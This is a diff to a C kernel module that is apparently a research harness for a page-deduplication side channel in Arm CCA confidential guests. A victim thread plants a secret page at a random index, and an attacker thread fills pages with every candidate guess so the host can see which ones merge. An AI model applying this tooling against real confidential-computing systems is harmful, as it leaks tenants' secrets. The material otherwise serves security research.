@@ -203,6 +203,9 @@ static unsigned int is_victim;
 module_param(is_victim, uint, S_IRUGO);
 MODULE_PARM_DESC(is_victim, "foo");
 
+#define NUM_PAGES 1024
+#define ATTACKER_INTERVAL_MS 200
+
 static char *set_page_mergeable(const char *content)
 {
 	char *buf = (char *)get_zeroed_page(GFP_KERNEL);
@@ -219,8 +222,6 @@ static char *set_page_mergeable(const char *content)
 	return buf;
 }
 
-static char *pages[32];
-
 static void send_ipa_to_host(uint64_t id, uint64_t va)
 {
 	uint64_t *gprs = (uint64_t *)get_zeroed_page(GFP_KERNEL);
@@ -233,29 +234,30 @@ static void send_ipa_to_host(uint64_t id, uint64_t va)
 
 static void victim_func(struct work_struct *work)
 {
-	for (int i = 0; i < (int)ARRAY_SIZE(pages); i++) {
+	uint32_t r = get_random_u32() % NUM_PAGES;
+	pr_info("Victim: r=%u\n", r);
+
+	for (int i = 0; i < NUM_PAGES; i++) {
 		char content[64];
-		if (i == 4 || i == 7 || i == 10 || i == 15
-				|| i == 22 || i == 24 || i == 25 || i == 31) {
-			snprintf(content, sizeof(content), "pwd-%c", 'a' + i);
+		if (i == r) {
+			snprintf(content, sizeof(content), "pwd-%d", i);
 		} else {
-			snprintf(content, sizeof(content), "victim-%c", 'a' + i);
+			snprintf(content, sizeof(content), "victim-%d", i);
 		}
-		pages[i] = set_page_mergeable(content);
-		send_ipa_to_host(0xdeadcafe, (uint64_t)pages[i]);
-		msleep(200);
+		char *page = set_page_mergeable(content);
+		send_ipa_to_host(0xdeadcafe, (uint64_t)page);
 	}
 }
 DECLARE_DELAYED_WORK(victim_work, victim_func);
 
 static void attacker_func(struct work_struct *work)
 {
-	for (int i = 0; i < (int)ARRAY_SIZE(pages); i++) {
+	for (int i = 0; i < NUM_PAGES; i++) {
 		char content[64];
-		snprintf(content, sizeof(content), "pwd-%c", 'a' + i);
-		pages[i] = set_page_mergeable(content);
-		send_ipa_to_host(0xdeadcaff, (uint64_t)pages[i]);
-		msleep(200);
+		snprintf(content, sizeof(content), "pwd-%d", i);
+		char *page = set_page_mergeable(content);
+		send_ipa_to_host(0xdeadcaff, (uint64_t)page);
+		msleep(ATTACKER_INTERVAL_MS);
 	}
 }
 DECLARE_DELAYED_WORK(attacker_work, attacker_func);
@@ -284,7 +286,7 @@ static int __init arm_cca_guest_init(void)
 	pr_info("is_victim=%d\n", is_victim);
 
 	if (is_attacker) {
-		schedule_delayed_work(&attacker_work, 3000);
+		schedule_delayed_work(&attacker_work, 6000);
 	} else if (is_victim) {
 		schedule_delayed_work(&victim_work, 300);
 	}
